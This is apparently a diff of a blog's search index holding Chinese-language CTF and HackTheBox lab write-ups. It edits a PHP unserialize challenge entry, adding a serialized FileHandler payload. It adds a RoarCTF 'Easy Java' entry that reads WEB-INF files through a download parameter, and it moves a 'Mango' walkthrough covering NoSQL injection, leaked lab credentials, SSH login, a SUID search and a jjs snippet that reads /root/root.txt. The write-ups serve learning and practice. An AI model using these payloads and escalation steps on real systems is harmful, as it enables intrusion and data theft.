@@ -462,9 +462,26 @@
                 <div class="image-caption">image.png</div>
             </figure>
 
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
 
-<p>然后解码</p>
+<p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;N;}</p>
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>java…在下面有个 help 访问说没那个东西，但是改成 post 传参可以下载下来，找一下配置信息<br>/WEB-INF/web.xml</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600669431397-cb054631-6a4b-481b-a6ac-cecfd2f2406a.png#align=left&display=inline&height=478&margin=%5Bobject%20Object%5D&name=image.png&originHeight=956&originWidth=1306&size=144642&status=done&style=stroke&width=653" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后在 filename=/WEB-INF/classes/com/wm/ctf/FlagController.class，解码得到</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600669561894-0694dc4e-3feb-4f0e-ac9c-cb5872cd0549.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=727&originWidth=1726&size=212298&status=done&style=none&width=863" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 ]]></content>
   </entry>
   <entry>
@@ -14821,78 +14838,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Mango</title>
-    <url>/2020/03/09/tp9x81/</url>
-    <content><![CDATA[<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583758313592-08a24649-f41c-4ef2-b1dc-2f323f1d191b.png#align=left&display=inline&height=422&name=image.png&originHeight=844&originWidth=1538&size=214940&status=done&style=none&width=769" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>不知道为啥，做了这几个里面这个超级卡，基本没啥反应的那种</p>
-<p>nmap 扫描端口</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583759782675-676f61ef-2b1c-40e0-8344-1730e6cecc40.png#align=left&display=inline&height=405&name=image.png&originHeight=573&originWidth=901&size=137041&status=done&style=none&width=637" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>同时发现了一个网址：在 443  端口  staging-order.mango.htb</p>
-<p>vim /etc/hosts，把 10.10.10.162   staging-order.mango.htb</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760729323-be38d915-17dd-4023-82a1-58babc5492e5.png#align=left&display=inline&height=195&name=image.png&originHeight=208&originWidth=596&size=32971&status=done&style=none&width=560" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>访问得到一个登录框</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760814048-7dc4a712-8a71-4404-b6b8-e57ac7eefe72.png#align=left&display=inline&height=328&name=image.png&originHeight=371&originWidth=362&size=16557&status=done&style=stroke&width=320" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p><strong>nosql 注入</strong></p>
-<p>先了解一些 mangodb  在  web  知识库补充</p>
-<p>有个专门爆破用户名和密码的脚本：<a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" target="_blank" rel="noopener">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583973993862-b26ea0b0-e4b4-45b2-bd62-3b38c74a97c0.png#align=left&display=inline&height=286&name=image.png&originHeight=474&originWidth=903&size=80564&status=done&style=none&width=544" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>太慢了，就直接用大佬的结果了<br>mango：h3mXK8RhU~f{]f5H<br>admin：t9KcS3&gt;!0B#2</p>
-<p>可以直接用  ssh  登录到  ssh <a href="mailto:mango@10.10.10.162">mango@10.10.10.162</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583974501839-3686e7f7-f36a-46e9-a8e2-cc9525bd76d4.png#align=left&display=inline&height=502&name=image.png&originHeight=726&originWidth=786&size=147809&status=done&style=none&width=543" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>su admin  切换到  admin  用户</p>
-<p>在  admin 的目录下面找到  user.txt</p>
-<p>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null<br>可以发现  jjs  是用  root  运行的</p>
-<p>运行  jjs<br>这样输入：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">var filename = "/root/root.txt";</span><br><span class="line">var content = new java.lang.String(</span><br><span class="line">                   java.nio.file.Files.readAllBytes(</span><br><span class="line">                     java.nio.file.Paths.get(filename)</span><br><span class="line">                   )</span><br><span class="line">                 );</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
-
-<p>就可以拿到  root.txt</p>
-<p>实在是佩服这个网，连不上，不截图了，也没发交  flag  了 Orz</p>
-<p>参考：<a href="https://rmccarth.info/post/htb/mango/" target="_blank" rel="noopener">https://rmccarth.info/post/htb/mango/</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>DC-4</title>
     <url>/2020/04/06/ttamkh/</url>
     <content><![CDATA[<p>nmap 扫描端口</p>
@@ -19467,6 +19412,78 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install       \</span><br><span class="line">    cmake                  \</span><br><span class="line">    build-essential        \</span><br><span class="line">    libboost-dev           \</span><br><span class="line">    libqt5xmlpatterns5-dev \</span><br><span class="line">    qtbase5-dev            \</span><br><span class="line">    qt5-default            \</span><br><span class="line">    libqt5svg5-dev         \</span><br><span class="line">    libgraphviz-dev        \</span><br><span class="line">    libcapstone-dev        \</span><br><span class="line">    pkg-config</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/eteran/edb-debugger.git</span><br><span class="line"><span class="built_in">cd</span> edb-debugger</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr/<span class="built_in">local</span>/ ..</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
 
 <p>安装完成后直接在命令行里使用  edb 运行</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Mango</title>
+    <url>/2020/03/09/tp9x81/</url>
+    <content><![CDATA[<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583758313592-08a24649-f41c-4ef2-b1dc-2f323f1d191b.png#align=left&display=inline&height=422&name=image.png&originHeight=844&originWidth=1538&size=214940&status=done&style=none&width=769" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>不知道为啥，做了这几个里面这个超级卡，基本没啥反应的那种</p>
+<p>nmap 扫描端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583759782675-676f61ef-2b1c-40e0-8344-1730e6cecc40.png#align=left&display=inline&height=405&name=image.png&originHeight=573&originWidth=901&size=137041&status=done&style=none&width=637" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>同时发现了一个网址：在 443  端口  staging-order.mango.htb</p>
+<p>vim /etc/hosts，把 10.10.10.162   staging-order.mango.htb</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760729323-be38d915-17dd-4023-82a1-58babc5492e5.png#align=left&display=inline&height=195&name=image.png&originHeight=208&originWidth=596&size=32971&status=done&style=none&width=560" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问得到一个登录框</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760814048-7dc4a712-8a71-4404-b6b8-e57ac7eefe72.png#align=left&display=inline&height=328&name=image.png&originHeight=371&originWidth=362&size=16557&status=done&style=stroke&width=320" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><strong>nosql 注入</strong></p>
+<p>先了解一些 mangodb  在  web  知识库补充</p>
+<p>有个专门爆破用户名和密码的脚本：<a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" target="_blank" rel="noopener">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583973993862-b26ea0b0-e4b4-45b2-bd62-3b38c74a97c0.png#align=left&display=inline&height=286&name=image.png&originHeight=474&originWidth=903&size=80564&status=done&style=none&width=544" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>太慢了，就直接用大佬的结果了<br>mango：h3mXK8RhU~f{]f5H<br>admin：t9KcS3&gt;!0B#2</p>
+<p>可以直接用  ssh  登录到  ssh <a href="mailto:mango@10.10.10.162">mango@10.10.10.162</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583974501839-3686e7f7-f36a-46e9-a8e2-cc9525bd76d4.png#align=left&display=inline&height=502&name=image.png&originHeight=726&originWidth=786&size=147809&status=done&style=none&width=543" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>su admin  切换到  admin  用户</p>
+<p>在  admin 的目录下面找到  user.txt</p>
+<p>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null<br>可以发现  jjs  是用  root  运行的</p>
+<p>运行  jjs<br>这样输入：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">var filename = "/root/root.txt";</span><br><span class="line">var content = new java.lang.String(</span><br><span class="line">                   java.nio.file.Files.readAllBytes(</span><br><span class="line">                     java.nio.file.Paths.get(filename)</span><br><span class="line">                   )</span><br><span class="line">                 );</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
+
+<p>就可以拿到  root.txt</p>
+<p>实在是佩服这个网，连不上，不截图了，也没发交  flag  了 Orz</p>
+<p>参考：<a href="https://rmccarth.info/post/htb/mango/" target="_blank" rel="noopener">https://rmccarth.info/post/htb/mango/</a></p>
 ]]></content>
   </entry>
 </search>
